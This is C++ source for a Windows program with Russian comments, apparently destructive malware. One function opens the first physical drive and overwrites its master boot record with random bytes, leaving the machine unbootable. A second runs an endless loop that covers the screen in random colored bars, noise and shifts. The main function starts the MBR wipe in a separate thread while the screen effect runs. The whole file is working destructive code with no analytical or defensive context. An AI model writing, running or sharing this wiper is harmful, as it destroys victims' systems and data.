#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <ctime>

// ==========================================
// ЧАСТЬ 1: СНОС MBR
// ==========================================
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        srand(time(NULL));
        for (int i = 0; i < 512; i++) {
            garbage[i] = rand() % 256;
        }
        DWORD bytesWritten;
        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// ==========================================
// ЧАСТЬ 2: СБОЙ МАТРИЦЫ (GDI-АТАКА)
// ==========================================
void MatrixGlitch() {
    // Получаем контекст экрана
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    srand(time(NULL));
    
    // Бесконечный цикл рисования
    while (true) {
        // Рисуем случайные горизонтальные полосы (глитч)
        for (int i = 0; i < 50; i++) {
            int y = rand() % screenHeight;
            int height = rand() % 20 + 1;
            // Случайный цвет (матрица - зеленый, но добавим кислотных)
            COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
            HBRUSH brush = CreateSolidBrush(color);
            RECT rect = {0, y, screenWidth, y + height};
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);
        }
        
        // Рисуем случайные "пиксели" (шум)
        for (int i = 0; i < 1000; i++) {
            int x = rand() % screenWidth;
            int y = rand() % screenHeight;
            COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
            SetPixel(hdc, x, y, color);
        }
        
        // Дергаем экран (сдвиг)
        if (rand() % 100 < 10) { // 10% шанс на сдвиг
            BitBlt(hdc, rand() % 10 - 5, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
        }
        
        Sleep(10); // Задержка для эффекта мерцания
    }
    ReleaseDC(NULL, hdc);
}

// ==========================================
// ГЛАВНАЯ ФУНКЦИЯ
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Запускаем снос MBR в отдельном потоке (чтобы не блокировать визуал)
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DestroyMBR, NULL, 0, NULL);
    
    // Запускаем визуальный хаос
    MatrixGlitch();
    
    return 0;
}
